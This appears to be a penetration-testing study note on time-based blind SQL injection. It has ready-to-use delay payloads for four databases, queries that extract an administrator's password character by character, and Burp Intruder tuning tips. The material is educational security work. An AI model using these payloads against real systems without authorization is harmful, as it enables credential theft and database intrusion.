# SQLi: Inferential (Time-based) Blind

**Category:** SQL Injection

**Sub-Category:** Inferential / Blind (Time-based)

**Logic:** Inducing a deliberate time delay in the server's response to infer data when no UI changes or errors are visible.

---

## Exploit Logic

> Used when the application is "completely blind"—no error messages, no content changes, and no "Welcome Back" signals. We rely on the **response latency** as our data channel.

* **The Condition:** `TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) ||'`
* **The Signal:** * Logic is **True** → Database pauses for 5+ seconds → Response is **delayed**.
* Logic is **False** → Database responds **instantly**.



---

## Database Flavor Quirks

| Database | Delay Function | Inline Injection Example |
| --- | --- | --- |
| **PostgreSQL** | `pg_sleep(s)` | `' || pg_sleep(10)--` |
| **MySQL** | `SLEEP(s)` | `' AND SLEEP(10)--` |
| **MS SQL** | `WAITFOR DELAY 'h:m:s'` | `'; WAITFOR DELAY '0:0:10'--` |
| **Oracle** | `dbms_pipe.receive_message('a', s)` | `' AND 123=dbms_pipe.receive_message('a',10)--` |

---

## Extraction Methodology (PostgreSQL Example)

### 1. Verify Vulnerability

Confirm the injection point by forcing a significant delay.

* **Payload:** `' || pg_sleep(10)--`
* **Success:** The browser tab "spins" for exactly 10 seconds.

### 2. Confirm Table & User

Check for the existence of the target environment before dumping data.

```sql
-- Check if table 'users' and column 'password' exist
'|| (SELECT CASE WHEN (COUNT(*)>0) THEN pg_sleep(5) ELSE pg_sleep(0) END 
     FROM information_schema.columns WHERE table_name='users' AND column_name='password') ||'

```

### 3. Determine Data Length

```sql
'|| (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END 
     FROM users WHERE username='administrator') ||'

```

### 4. Data Exfiltration (Character-by-Character)

Iterate through the string using `SUBSTRING`.

```sql
'|| (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END 
     FROM users WHERE username='administrator') ||'

```

---

## Technical Caveats

* **Stacked Queries vs. Inline:** Most modern drivers block stacked queries (`;`). Always prefer **Inline Injection** (using `||`, `+`, or `AND`) to embed logic within the original statement.
* **Network Jitter:** High latency or unstable connections can cause "False Positives." Always set a delay high enough (e.g., 5-10s) to distinguish between a busy server and a successful trigger.
* **Optimization:** Use a "Greater Than" (`>`) search pattern (Binary Search) to find characters faster than testing every letter of the alphabet.

---

## Operational Insights

* **Intruder Configuration:**
* **Resource Pool:** Set "Maximum concurrent requests" to **1**. If you send 100 requests at once, the server may queue them, making every request appear "slow" and ruining your results.


* **Columns to Monitor:**
* In Burp Suite, add the **"Response received"** or **"Response time"** column to the results table. Sort by this column to see your **True** hits.



---

## Concept Summary

**"The Stopwatch"**: You are communicating with the database using Morse code via time. You ask a question, and if the database stays silent for 10 seconds before answering, the answer is "Yes." If it answers immediately, the answer is "No."
